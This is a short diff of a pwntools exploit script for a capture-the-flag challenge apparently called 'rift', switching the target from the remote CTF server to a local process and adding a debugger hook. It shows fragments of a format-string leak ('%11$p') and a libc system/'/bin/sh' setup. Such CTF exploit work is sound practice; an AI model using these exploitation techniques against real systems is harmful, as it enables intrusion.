@@ -3,8 +3,8 @@ from pwn import *
 exe = ELF("rift_patched")
 libc = ELF("libc.so.6")
 ld = ELF("ld-2.28.so")
-# p = process([exe.path])
-p= remote("tamuctf.com", 443, ssl=True, sni="rift")
+p = process([exe.path])
+# p= remote("tamuctf.com", 443, ssl=True, sni="rift")
 
 def GDB():
     context.terminal = ["alacritty", "-e"]
@@ -26,6 +26,7 @@ def delete():
 
 
 def main():
+    GDB()
     
     payload = b"%11$p"
     input()
@@ -44,7 +45,7 @@ def main():
     break_loop = stack -20
     
     # log.info(f"write addr: " + hex(writeaddr))
-    # log.info(f"leak: " + hex(addr))
+
     # log.info(f"system: " + hex(system_libc))
     # log.info(f"bin_sh: " + hex(bin_sh))
     log.info(f"addr: " + hex(addr))
